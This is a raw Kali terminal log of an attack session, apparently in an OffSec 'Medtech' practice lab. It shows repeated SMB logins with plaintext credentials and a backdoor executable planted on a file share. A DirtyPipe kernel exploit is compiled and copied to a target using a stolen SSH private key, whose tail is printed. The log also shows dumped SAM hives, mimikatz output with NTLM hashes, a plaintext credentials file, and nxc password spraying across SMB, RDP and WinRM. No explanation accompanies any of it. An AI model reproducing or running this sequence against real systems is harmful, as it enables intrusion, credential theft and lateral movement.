@@ -1,0 +1,987 @@
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m cd Common/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.83/C -U wario%Mushroom!
+session setup failed: NT_STATUS_LOGON_FAILURE
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.83/C -U wario%Mushroom!
+session setup failed: NT_STATUS_LOGON_FAILURE
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.82/C -U wario%Mushroom!
+session setup failed: NT_STATUS_LOGON_FAILURE
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.82/C -U medtech/wario%Mu
+shroom
+session setup failed: NT_STATUS_LOGON_FAILURE
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.82/C -U medtech/wario%Mu
+shroom
+session setup failed: NT_STATUS_LOGON_FAILURE
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.82/C --user medtech/wari
+o%Mushroom
+session setup failed: NT_STATUS_LOGON_FAILURE
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.83/C --user medtech/wari
+o%Mushroom
+session setup failed: NT_STATUS_LOGON_FAILURE
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.83/C --user medtech/wari
+o%Mushroom!
+Try "help" to get a list of possible commands.
+smb: \>
+smb: \> cd C:\Users\Wario
+cd \C:\Users\Wario\: NT_STATUS_OBJECT_NAME_INVALID
+smb: \> cd Users\Wario
+smb: \Users\Wario\> put winPEASx64.exe
+cli_push returned NT_STATUS_IO_TIMEOUT
+NT_STATUS_CONNECTION_RESET closing remote file \Use
+rs\Wario\winPEASx64.exe
+smb: \Users\Wario\> putting file winPEASx64.exe as
+\Users\Wario\winPEASx64.exe The connection is disco
+nnected now: NT_STATUS_CONNECTION_DISCONNECTED
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.83/C --user medtech/wari
+o%Mushroom!
+do_connect: Connection to 172.16.174.83 failed (Err
+or NT_STATUS_IO_TIMEOUT)
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.83/C --user medtech/wari
+o%Mushroom!
+do_connect: Connection to 172.16.174.83 failed (Err
+or NT_STATUS_IO_TIMEOUT)
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m smbclient //172.16.174.83/C --user medtech/wari
+o%Mushroom!
+do_connect: Connection to 172.16.174.83 failed (Err
+or NT_STATUS_IO_TIMEOUT)
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m tail ~/PG/Medtech/Loot/mario.key
+EdjihMiq66KcDpX1kOGBtBdoJW8wmg8hM9oIWDsZo5YtYLuwAAA
+MEAwZgDYsLbkZ3PFRbE
+bri+N+0CD6ZoR96e5Dfj63R4OoJJoKqsjrKTALUMVDl/jUvPug5
+5wH1+foC1PU0+B7YUtd
+kVcc3K61Evgkk2qdnIVK9SAFYCl9SZpi8RnuPyVQLaLbyOpi3xm
+sXsHVXSov7R95j6hRHG
+PP+eZoV5BRRxbKHuUc2FEslrWbceqnsW3xLaPhvP7cVYbva+fTG
+xpySK2zlV1nZkGoZIeD
+sYEyr9TmEDEfBM/S1s1algsnxePC/5AAAAwQC6DpsXDIqa4/MeJ
+L4SEImkC9WaZN5y4tw6
+hxy01Z2IkT9BGJQwWiRkTfnQfkoT9bt4zE+oKhcedwCdy9WJPMX
+fCvJq8N9i9unTNIvbMa
+ox1fC+h+mZmfkcn+QopOqfdCpo+63u49lGoKFTTFBn7opSjJLVQ
+iyyT1GyXtZeTmrabwwj
+k+9j0Pd1hgfBj0z3CJODZlPILvXRGLwIyTBCQJePgr+fD1SfeYK
+/1xfmUAg7UE4hFQ2GT3
+pI77A9Emp3E9cAAAAJbWFyaW9AdnBuAQI=
+-----END OPENSSH PRIVATE KEY-----
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m cd ~/PG/Medtech/Temp/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m git clone https://github.com/AlexisAhmed/CVE-20
+22-0847-DirtyPipe-Exploits.git
+Cloning into 'CVE-2022-0847-DirtyPipe-Exploits'...
+remote: Enumerating objects: 27, done.
+remote: Counting objects: 100% (27/27), done.
+remote: Compressing objects: 100% (23/23), done.
+remote: Total 27 (delta 7), reused 9 (delta 2), pac
+k-reused 0 (from 0)
+Receiving objects: 100% (27/27), 11.46 KiB | 2.29 M
+iB/s, done.
+Resolving deltas: 100% (7/7), done.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m ls
+[1m[34mCVE-2022-0847-DirtyPipe-Exploits[0m  GodPotato-NET4.ex
+e  privesc.exe  SigmaPotato.exe
+foothold.exe                      [1m[32mligolo.exe[0m
+   shell.ps1
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m cd CVE-2022-0847-DirtyPipe-Exploits/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m ls
+[1m[32mcompile.sh[0m  exploit-1.c  exploit-2.c  README.md
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m ./compile.sh
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m chmod +x compile.sh
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m ./compile.sh
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m ls
+[1m[32mcompile.sh[0m  [1m[32mexploit-1[0m  exploit-1.c  [1m[32mexploit-2[0m  expl
+oit-2.c  README.md
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m cat compile.sh
+#!/bin/bash
+gcc exploit-1.c -o exploit-1
+gcc exploit-2.c -o exploit-2
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m scp -I ../
+../CVE-2022-0847-DirtyPipe-Exploits/  ../privesc.ex
+e
+../foothold.exe                       ../shell.ps1
+../GodPotato-NET4.exe                 ../SigmaPotat
+o.exe
+../ligolo.exe
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m scp -I ../
+../CVE-2022-0847-DirtyPipe-Exploits/  ../privesc.ex
+e
+../foothold.exe                       ../shell.ps1
+../GodPotato-NET4.exe                 ../SigmaPotat
+o.exe
+../ligolo.exe
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m scp -I ../../Loot/
+../../Loot/4_mimikatz.txt
+../../Loot/Creds.txt
+../../Loot/FILES02_fileMonitorBackup.log
+../../Loot/FILES02_mimikatz
+../../Loot/FILES02_sam.hive
+../../Loot/FILES02_secrets
+../../Loot/FILES02_system.hive
+../../Loot/fm.log
+../../Loot/hashes.txt
+../../Loot/Joe.hash
+../../Loot/mario.key
+../../Loot/medtech.zip
+../../Loot/NTUSER.DAT
+../../Loot/NTUSER.DAT\{1c2b59c6-c5f5-11eb-bacb-000d
+3a96488e\}.TM.blf
+../../Loot/NTUSER.DAT\{1c2b59c6-c5f5-11eb-bacb-000d
+3a96488e\}.TMContainer00000000000000000001.regtrans
+-ms
+../../Loot/NTUSER.DAT\{1c2b59c6-c5f5-11eb-bacb-000d
+3a96488e\}.TMContainer00000000000000000002.regtrans
+-ms
+../../Loot/ntuser.dat.LOG1
+../../Loot/ntuser.dat.LOG2
+../../Loot/ntuser.ini
+../../Loot/users.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m scp -I ../../Loot/mario.key exploit-
+exploit-1     exploit-1.c   exploit-2     exploit-2
+.c
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m scp -I ../../Loot/mario.key exploit-1 mario@172
+.16.174.14:/home/mario/
+scp: unknown option -- I
+usage: scp [-346ABCOpqRrsTv] [-c cipher] [-D sftp_s
+erver_path] [-F ssh_config]
+           [-i identity_file] [-J destination] [-l
+limit] [-o ssh_option]
+           [-P port] [-S program] [-X sftp_option]
+source ... target
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m scp -i ../../Loot/mario.key exploit-1 mario@172
+.16.174.14:/home/mario/
+** WARNING: connection is not using a post-quantum
+key exchange algorithm.
+** This session may be vulnerable to "store now, de
+crypt later" attacks.
+** The server may need to be upgraded. See https://
+openssh.com/pq.html
+exploit-1
+                    100%   16KB  84.7KB/s   00:00
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m scp -i ../../Loot/mario.key exploit-2 mario@172
+.16.174.14:/home/mario/
+** WARNING: connection is not using a post-quantum
+key exchange algorithm.
+** This session may be vulnerable to "store now, de
+crypt later" attacks.
+** The server may need to be upgraded. See https://
+openssh.com/pq.html
+exploit-2
+                    100%   17KB  88.1KB/s   00:00
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m cd ../../
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech[0m]
+└─[1m[34m$[0m scp -i ./Loot/mario.key /home/sk4t4/Common/linp
+eas.sh mario@172.16.174.14:/home/mario/
+** WARNING: connection is not using a post-quantum
+key exchange algorithm.
+** This session may be vulnerable to "store now, de
+crypt later" attacks.
+** The server may need to be upgraded. See https://
+openssh.com/pq.html
+linpeas.sh       100%  967KB 260.9KB/s   00:03
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech[0m]
+└─[1m[34m$[0m cd Temp/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m scp -r CVE-2022-0847-DirtyPipe-Exploits/ brad@1
+92.168.0.13:~/
+** WARNING: connection is not using a post-quantum
+key exchange algorithm.
+** This session may be vulnerable to "store now, de
+crypt later" attacks.
+** The server may need to be upgraded. See https://
+openssh.com/pq.html
+brad@192.168.0.13's password:
+applypatch-msg.sample
+                    100%  478    95.3KB/s   00:00
+commit-msg.sample
+                    100%  896   221.4KB/s   00:00
+fsmonitor-watchman.sample
+                    100% 4726     1.4MB/s   00:00
+post-update.sample
+                    100%  189    37.7KB/s   00:00
+pre-applypatch.sample
+                    100%  424   111.1KB/s   00:00
+pre-commit.sample
+                    100% 1649   437.6KB/s   00:00
+pre-merge-commit.sample
+                    100%  416    73.8KB/s   00:00
+pre-push.sample
+                    100% 1374   357.1KB/s   00:00
+pre-rebase.sample
+                    100% 4898     1.3MB/s   00:00
+pre-receive.sample
+                    100%  544   110.6KB/s   00:00
+prepare-commit-msg.sample
+                    100% 1492   416.1KB/s   00:00
+push-to-checkout.sample
+                    100% 2783   734.0KB/s   00:00
+sendemail-validate.sample
+                    100% 2308   593.6KB/s   00:00
+update.sample
+                    100% 3650     1.0MB/s   00:00
+exclude
+                    100%  240    64.0KB/s   00:00
+description
+                    100%   73    16.6KB/s   00:00
+pack-c44007e5611aedf1cadc07900e2dde8d013587be.pack
+                    100%   11KB   2.5MB/s   00:00
+pack-c44007e5611aedf1cadc07900e2dde8d013587be.rev
+                    100%  160    40.6KB/s   00:00
+pack-c44007e5611aedf1cadc07900e2dde8d013587be.idx
+                    100% 1828   425.5KB/s   00:00
+main
+                    100%   41    10.2KB/s   00:00
+HEAD
+                    100%   30     7.0KB/s   00:00
+packed-refs
+                    100%  112    29.5KB/s   00:00
+HEAD
+                    100%  213    36.1KB/s   00:00
+main
+                    100%  213    40.8KB/s   00:00
+HEAD
+                    100%  213    52.2KB/s   00:00
+HEAD
+                    100%   21     3.7KB/s   00:00
+config
+                    100%  288    66.9KB/s   00:00
+index
+                    100%  377    89.2KB/s   00:00
+README.md
+                    100% 2937   661.9KB/s   00:00
+compile.sh
+                    100%   71    22.1KB/s   00:00
+exploit-1.c
+                    100% 5364     1.0MB/s   00:00
+exploit-2.c
+                    100% 7752     2.0MB/s   00:00
+exploit-1
+                    100%   16KB   4.7MB/s   00:00
+exploit-2
+                    100%   17KB   4.5MB/s   00:00
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m rm -rf CVE-2022-0847-DirtyPipe-Exploits/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m scp -r brad@192.168.0.13:CVE*/ ./
+** WARNING: connection is not using a post-quantum
+key exchange algorithm.
+** This session may be vulnerable to "store now, de
+crypt later" attacks.
+** The server may need to be upgraded. See https://
+openssh.com/pq.html
+brad@192.168.0.13's password:
+exploit-2.c
+                    100% 7752   722.3KB/s   00:00
+exclude
+                    100%  240    25.7KB/s   00:00
+pack-c44007e5611aedf1cadc07900e2dde8d013587be.rev
+                    100%  160    12.0KB/s   00:00
+pack-c44007e5611aedf1cadc07900e2dde8d013587be.pack
+                    100%   11KB   1.1MB/s   00:00
+pack-c44007e5611aedf1cadc07900e2dde8d013587be.idx
+                    100% 1828   137.6KB/s   00:00
+index
+                    100%  377    37.0KB/s   00:00
+HEAD
+                    100%  213    13.5KB/s   00:00
+main
+                    100%  213    22.5KB/s   00:00
+HEAD
+                    100%  213    21.9KB/s   00:00
+config
+                    100%  288    30.8KB/s   00:00
+update.sample
+                    100% 3650   123.2KB/s   00:00
+prepare-commit-msg.sample
+                    100% 1492   162.8KB/s   00:00
+pre-rebase.sample
+                    100% 4898   392.2KB/s   00:00
+pre-merge-commit.sample
+                    100%  416    22.3KB/s   00:00
+pre-receive.sample
+                    100%  544    53.8KB/s   00:00
+push-to-checkout.sample
+                    100% 2783   257.2KB/s   00:00
+sendemail-validate.sample
+                    100% 2308   195.9KB/s   00:00
+post-update.sample
+                    100%  189    10.5KB/s   00:00
+applypatch-msg.sample
+                    100%  478    56.7KB/s   00:00
+pre-commit.sample
+                    100% 1649    99.1KB/s   00:00
+pre-applypatch.sample
+                    100%  424    30.6KB/s   00:00
+fsmonitor-watchman.sample
+                    100% 4726   581.0KB/s   00:00
+commit-msg.sample
+                    100%  896   107.0KB/s   00:00
+pre-push.sample
+                    100% 1374    94.9KB/s   00:00
+HEAD
+                    100%   21     1.7KB/s   00:00
+packed-refs
+                    100%  112    10.8KB/s   00:00
+main
+                    100%   41     2.7KB/s   00:00
+HEAD
+                    100%   30     2.2KB/s   00:00
+description
+                    100%   73     7.3KB/s   00:00
+exploit-1.c
+                    100% 5364   203.2KB/s   00:00
+README.md
+                    100% 2937   266.4KB/s   00:00
+exploit-1
+                    100%   17KB   2.0MB/s   00:00
+exploit-2
+                    100%   18KB   1.5MB/s   00:00
+compile.sh
+                    100%   71     7.7KB/s   00:00
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m cd CVE-2022-0847-DirtyPipe-Exploits/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m ls
+[1m[32mcompile.sh[0m  [1m[32mexploit-1[0m  exploit-1.c  [1m[32mexploit-2[0m  expl
+oit-2.c  README.md
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m scp -i ../../Loot/mario.key /home/sk4t4/Common/
+linpeas.sh mario@172.16.174.14:/home/mario/
+** WARNING: connection is not using a post-quantum
+key exchange algorithm.
+** This session may be vulnerable to "store now, de
+crypt later" attacks.
+** The server may need to be upgraded. See https://
+openssh.com/pq.html
+linpeas.sh
+                          100%  967KB 520.2KB/s   0
+0:01
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m scp -i ../../Loot/mario.key exploit-* mario@172
+.16.174.14:/home/mario/
+** WARNING: connection is not using a post-quantum
+key exchange algorithm.
+** This session may be vulnerable to "store now, de
+crypt later" attacks.
+** The server may need to be upgraded. See https://
+openssh.com/pq.html
+exploit-1
+                          100%   17KB  89.2KB/s   0
+0:00
+exploit-1.c
+                          100% 5364    52.1KB/s   0
+0:00
+exploit-2
+                          100%   18KB 178.2KB/s   0
+0:00
+exploit-2.c
+                          100% 7752    83.8KB/s   0
+0:00
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp/CVE-20
+22-0847-DirtyPipe-Exploits[0m]
+└─[1m[34m$[0m cd ../
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m smbclient //172.16.174.83/C --user medtech/wari
+o%Mushroom!
+Try "help" to get a list of possible commands.
+smb: \> cd DevelopmentExecutables\
+smb: \DevelopmentExecutables\> put backdoor.exe
+putting file backdoor.exe as \DevelopmentExecutable
+s\backdoor.exe (25.6 kB/s) (average 25.6 kB/s)
+smb: \DevelopmentExecutables\> exit
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Temp[0m]
+└─[1m[34m$[0m cd ../Loot/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m vim CLIENT02_mimikatz.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m grep -i password CLIENT02_mimikatz.txt |sort -u
+	 * Password : 00 34 83 df 24 96 e4 5
+5 74 f0 73 92 c7 8f 33 f8 e6 a1 33 bf 96 84 6c 22 8
+c 9f f5 6a 70 20 06 7e 06 20 d3 55 7a 58 d6 7d a8 3
+6 ae 62 60 09 e1 4e 7d d5 ba c8 ed 97 df 8f b6 6c a
+c 6d b0 6       3 0a 64 35 17 4b 51 9a 36 7f 5d 7b
+55 6f b7 2c 51 ff c4 3f 7b c9 6e b7 47 6f 45 c7 90
+55 0a 22 4e 21 1d 5b 86 69 71 93 3f 91 9d 3e 61 3d
+7e ed c2 e0 04 b2 e0 fd 57 cd d9 49 2f b8 54 76 52
+f2 08 f7 99 b7 cf 1e 19 09 cf 9f 50 e4 d4 86 1c da
+22 a7 e8 cf c6 b0 7c a7 2f 73 cf 7e fb 8a 39 32 49
+a3 59 9e 7e 5d 9d c6 d8 17 a6 88 44 2a 06 38 0c 91
+23 52 67 df 8a 46 8a f3 0f 9b e8 64 57 a4 80 36 37
+93 50 49 23 a6 3b ae 4b c6 3f fe bd 86 40 d2 c8 f3
+8c 2d fd 80 c3 17 9d 4c 94 09 a3 ac 4a 21 86 90 2b
+7b 11 bb 3c 93 47 ce 28 d2 fe 56 61 eb c1
+	 * Password : c1 0e 2b 83 62 d3 ed 8
+0 4e 3c 21 47 8d 1e 20 3f 78 20 57 3a c4 a5 b0 ff b
+1 07 cf 17 61 c5 32 4a c8 30 5f 52 9e 97 a8 4b 8f 2
+4 a5 9d 19 b6 1a 00 4d 4b 6d 28 95 50 9c e8 41 d5 d
+9 02 10 f       d d8 8f 4a 49 79 c2 b9 73 18 95 03
+86 eb 47 e0 3e 85 ea 77 29 7a a9 be de 5b 6d 84 d4
+e6 35 d0 f9 f2 a2 84 4c d7 f9 9f c8 82 f0 9e f3 14
+15 ed 27 bc 83 0a 70 6e 35 a3 de 9e 98 71 89 58 fe
+4e 53 80 f2 d9 13 6f 30 05 61 e1 f3 39 df fc 7d 5d
+0c 87 3f 27 a1 d7 0a 2e 75 e6 5d bd 29 0f 78 5f 46
+e1 8d 93 40 f1 b4 26 0c 75 22 32 28 d1 0f 66 e1 0d
+20 0b b2 b3 ce d1 bc 34 0e 75 13 f6 b1 47 1d 49 b9
+15 6c e8 5f 74 86 c8 00 76 78 48 2b e4 17 59 a1 f0
+43 70 ca 57 ca 21 d1 d9 8a 7a c9 6c 29 2e 87 f3 4b
+34 f3 9c 9e b9 27 b9 3b 80 25 78 a1 7b 21
+	 * Password : (null)
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m grep -i NTLM CLIENT02_mimikatz.txt |sort -u
+	 * NTLM     : 00fd074ec24fd70c76727e
+e9b2d7aacd
+	 * NTLM     : 4b1e15e3714b29e73596cf
+402642ad62
+	 * NTLM     : 8caf19e58560b29dc19447
+dcdca2cefb
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m cat hashes.txt
+08d7a47a6f9f66b97b1bae4178747494
+0e639974192eb32918760fbc34e47bb7
+b2c03054c306ac8fc5f9d188710b0168
+b6191454048eb6ea7bb3058ed8c088f2
+abf36048c1cf88f5603381c5128feb8e
+5be63a865b65349851c1f11a067a3068
+fdf36048c1cf88f5630381c5e38feb8e
+8e9e1516818ce4e54247e71e71b5f436
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m vim CLIENT02_mimikatz.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m grep -i Username CLIENT02_mimikatz.txt |sort -u
+	 * Username : Administrator
+	 * Username : client02$
+	 * Username : CLIENT02$
+	 * Username : (null)
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m ls
+4_mimikatz.txt                 FILES02_sam.hive
+ Joe.hash
+       NTUSER.DAT{1c2b59c6-c5f5-11eb-bacb-000d3a964
+88e}.TMContainer00000000000000000001.regtrans-ms  u
+sers.txt
+CLIENT02_mimikatz.txt          FILES02_secrets
+ mario.key
+       NTUSER.DAT{1c2b59c6-c5f5-11eb-bacb-000d3a964
+88e}.TMContainer00000000000000000002.regtrans-ms
+Creds.txt                      FILES02_system.hive
+ [1m[31mmedtech.zip[0m
+       ntuser.dat.LOG1
+FILES02_fileMonitorBackup.log  fm.log
+ NTUSER.DAT
+       ntuser.dat.LOG2
+FILES02_mimikatz               hashes.txt
+ NTUSER.DAT{1c2b59c6-c5f5-11eb-bacb-000d3a96488e}.T
+M.blf  ntuser.ini
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m cat ls
+cat: ls: No such file or directory
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m ls
+4_mimikatz.txt                 FILES02_sam.hive
+ Joe.hash
+       NTUSER.DAT{1c2b59c6-c5f5-11eb-bacb-000d3a964
+88e}.TMContainer00000000000000000001.regtrans-ms  u
+sers.txt
+CLIENT02_mimikatz.txt          FILES02_secrets
+ mario.key
+       NTUSER.DAT{1c2b59c6-c5f5-11eb-bacb-000d3a964
+88e}.TMContainer00000000000000000002.regtrans-ms
+Creds.txt                      FILES02_system.hive
+ [1m[31mmedtech.zip[0m
+       ntuser.dat.LOG1
+FILES02_fileMonitorBackup.log  fm.log
+ NTUSER.DAT
+       ntuser.dat.LOG2
+FILES02_mimikatz               hashes.txt
+ NTUSER.DAT{1c2b59c6-c5f5-11eb-bacb-000d3a96488e}.T
+M.blf  ntuser.ini
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m cat Creds.txt
+joe : Flowers1
+wario : Mushroom!
+offsec : password
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m vim pass.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m for i in 12 82; do nxc smb 172.16.174.$i -u use
+rs.txt -p pass.txt;nxc rdp 172.16.174.$i -u users.t
+xt -p pass.txt;nxc winrm 172.16.174.$i -u users.txt
+ -p pass.txt;done
+[1m[34mSMB[0m         172.16.174.12   445    DEV04
+ [1m[34m[*][0m Windows Server 2022 Build 20348 x64 (name:DEV0
+4) (domain:medtech.com) ([1m[31msigning:False[0m) ([1m[36mSMBv1:None
+[0m)
+[1m[34mSMB[0m         172.16.174.12   445    DEV04
+ [1m[31m[-][0m medtech.com\Administrator:Mushroom! STATUS_LOG
+ON_FAILURE
+[1m[34mSMB[0m         172.16.174.12   445    DEV04
+ [1m[31m[-][0m medtech.com\krbtgt:Mushroom! STATUS_LOGON_FAIL
+URE
+[1m[34mSMB[0m         172.16.174.12   445    DEV04
+ [1m[31m[-][0m medtech.com\offsec:Mushroom! STATUS_LOGON_FAIL
+URE
+[1m[34mSMB[0m         172.16.174.12   445    DEV04
+ [1m[32m[+][0m medtech.com\yoshi:Mushroom!
+[1m[34mRDP[0m         172.16.174.12   3389   DEV04
+ [1m[34m[*][0m Windows 10 or Windows Server 2016 Build 20348
+(name:DEV04) (domain:medtech.com) ([1m[36mnla:True[0m)
+[1m[34mRDP[0m         172.16.174.12   3389   DEV04
+ [1m[31m[-][0m medtech.com\Administrator:Mushroom! (STATUS_LO
+GON_FAILURE)
+[1m[34mRDP[0m         172.16.174.12   3389   DEV04
+ [1m[31m[-][0m medtech.com\krbtgt:Mushroom! (STATUS_LOGON_FAI
+LURE)
+[1m[34mRDP[0m         172.16.174.12   3389   DEV04
+ [1m[31m[-][0m medtech.com\offsec:Mushroom! (STATUS_LOGON_FAI
+LURE)
+[1m[34mRDP[0m         172.16.174.12   3389   DEV04
+ [1m[32m[+][0m medtech.com\yoshi:Mushroom! [1m[33m(Pwn3d!)[0m
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[34m[*][0m Windows Server 2022 Build 20348 (name:DEV04) (
+domain:medtech.com)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
